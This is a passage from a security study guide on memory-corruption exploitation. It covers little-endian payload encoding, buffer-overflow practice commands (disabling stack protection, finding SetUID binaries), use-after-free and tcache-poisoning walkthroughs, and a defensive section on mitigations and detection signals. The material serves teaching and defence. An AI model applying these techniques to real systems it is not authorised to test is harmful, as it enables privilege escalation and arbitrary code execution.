| What is euid? | Effective UID — actual effective permissions held during file execution |

### Little Endian Conversion Examples

| Original Value | Little Endian (memory storage) |
|---------------|-------------------------------|
| 0xDEADBEEF | `\xef\xbe\xad\xde` |
| 0x12345678 | `\x78\x56\x34\x12` |
| 5678 (0x162E) | `\x2e\x16` |
| 31337 (0x7A69) | `\x69\x7a` |

### Practice Commands Summary

Compilation and debugging commands for buffer overflow practice. Use -fno-stack-protector and -z execstack options to disable protections.

```bash
# Compile program
gcc -o test test.c

# Pass arguments
./test abc def

# Pass numeric values with perl (backtick + -e option)
./program `perl -e 'print "\x78\x56\x34\x12"'`

# Pass numeric values with python (-c option)
./program `python -c 'print "\x78\x56\x34\x12"'`

# Check own permissions
id
whoami

# Find SetUID files (suppress errors)
find / -perm -4000 2>/dev/null

# Create symbolic link
ln -s test test1

# View hex dump
xxd filename

# View library function list
/usr/bin/nm /lib/libc.so.6 | more
```

---

## 13. Heap Exploitation Basics — Use-After-Free and tcache Poisoning

Everything covered so far has been a **stack** overflow. But the **heap**, managed by `malloc`/`free`, has its own class of vulnerabilities. glibc keeps freed chunks around for reuse in a size-bucketed **tcache** (thread-local cache) linked list — and that list structure itself is something an attacker can manipulate.

```
[Use-After-Free (UAF) explained]

Pointer p = malloc(64) allocates heap memory
free(p) is called -> the memory is freed, but p still points to that address (dangling pointer)
The program mistakenly keeps using p after free(p)
  -> if the attacker allocates the same size in between and gets that memory reused,
     the program treats the attacker's data as if it were still the original "valid object"
```

```c
// Vulnerable pattern: the pointer is never nulled out after free (dangling pointer)
Chunk *p = malloc(sizeof(Chunk));
p->vtable = &safe_vtable;
free(p);          // memory freed, but p still holds a "valid-looking" value
p->vtable->run();  // UAF! If an attacker reallocated and overwrote vtable in between, this is arbitrary code execution
```

```
[tcache poisoning explained (glibc >= 2.26)]

1) malloc two same-size chunks A and B, then free(A); free(B)
   -> tcache linked list: B -> A (LIFO, singly linked; newer glibc adds some safety
      checks, but they can be bypassed)
2) Via UAF or a heap overflow, overwrite B's "next chunk pointer" field with an
   arbitrary address (target)
   -> tcache list is now: target -> A
3) malloc the same size twice
   -> the first malloc returns B, and the second malloc returns the target address itself
   -> the attacker can now write to an arbitrary address as if it were a normal heap
      chunk (e.g. to overwrite a GOT entry)
```

```bash
# Visualize heap state with pwndbg/GEF (essential tooling for this)
gdb -q ./vuln
pwndbg> heap            # full heap chunk layout
pwndbg> bins             # inspect tcache/fastbin/unsorted bin lists
pwndbg> tcache            # detailed tcache structure

# Assisted heap-vulnerability inspection (glibc version offsets differ, verify first)
pwndbg> vis_heap_chunks
```

**Detection/Defense**: glibc 2.29+ introduced a double-free check for `tcache` entries, but it is not a complete block, so at the application level always null out a pointer immediately after `free` and validate it before any reuse. The root fix for heap exploitation is eliminating the vulnerability itself (static analysis/fuzzing to catch UAF and double-free), and at runtime, hardened allocators (e.g. glibc `Scudo`, `hardened_malloc`) or AddressSanitizer (ASan) catch these issues early during development.

---

<!-- detect-validate-03 -->
## Buffer Overflow Detection and Defense Validation

BOF describes *how control flow is hijacked*, but defenders must verify **where exploits leave traces (crash logs, mitigation trips)** and **whether ASLR, NX, stack canary, and RELRO are actually enabled**.

### Attack -> Layer -> Control (defender) -> Detection signal

| Technique | Targeted mitigation | Primary control (defender) | Detection signal |
|---|---|---|---|
| Stack smashing | Return address | Stack canary, FORTIFY | `*** stack smashing detected ***`, SIGSEGV |
| ret2libc/ROP | NX (DEP) | ASLR, CFI | Abnormal RIP, library-gadget call sequences |
| GOT overwrite | Dynamic linking | Full RELRO | GOT write attempts, abnormal memory-protect changes |
| Info leak (ASLR bypass) | Address randomization | Minimize leaks, logging | Repeated crashes then precise offset attempts |

### Defense validation (verify directly)

```bash
# 1) Verify mitigations are actually on (own build) — checksec
checksec --file=./vuln    # confirm NX enabled, Stack canary found, PIE, Full RELRO
# 2) Confirm host ASLR is fully enabled
cat /proc/sys/kernel/randomize_va_space   # 2 = full randomization (0 = disabled)
# 3) Detect stack smashing — check crash logs (coredump/journald) for canary message
journalctl -k | grep -i 'stack smashing' | tail
```

> Validate only on **owned binaries / controlled environments**. "Enabled canary/NX/ASLR" differs from "actually blocks the exploit" — reproduce the PoC to confirm the mitigation stops it with a crash ([[09_Exploit_Techniques]], [[66_Exploit_Development]]).
